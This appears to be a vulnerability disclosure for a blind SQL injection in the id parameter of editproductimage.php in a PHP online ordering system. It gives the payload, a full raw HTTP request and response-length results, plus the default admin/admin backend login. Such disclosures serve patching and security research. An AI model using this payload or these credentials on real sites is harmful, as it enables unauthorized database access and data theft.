# Online Ordering System v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin

vendors: https://www.sourcecodester.com/php/5125/online-ordering-system-using-phpmysql.html

Vulnerability File: /onlineordering/admin/editproductimage.php

Vulnerability location: /onlineordering/admin/editproductimage.php?id=,id

[+] Payload: /onlineordering/admin/editproductimage.php?id=19%27%20and%20length(database())%20=12--+ // Leak place ---> id

Current database name: shoppingcart,length is 12

```sql
GET /onlineordering/admin/editproductimage.php?id=19%27%20and%20length(database())%20=12--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=v112m4jpgqqtdo86av7lvbjv3l
Connection: close
```

When length (database (()) = 11, Content-Length: 449

![image](https://user-images.githubusercontent.com/54017627/167339152-c5195ddb-9d3a-4557-9c74-773728b52df1.png)

![image](https://user-images.githubusercontent.com/54017627/167339190-e2a87e50-7d6e-405f-a432-7ddffe03aab2.png)

When length (database (()) = 12, Content-Length: 313

![image](https://user-images.githubusercontent.com/54017627/167339131-b952f5a0-a437-4490-a7bb-9d9d6aac5dda.png)

![image](https://user-images.githubusercontent.com/54017627/167339172-9eed5024-7c70-4916-9e40-0ebb515ad201.png)
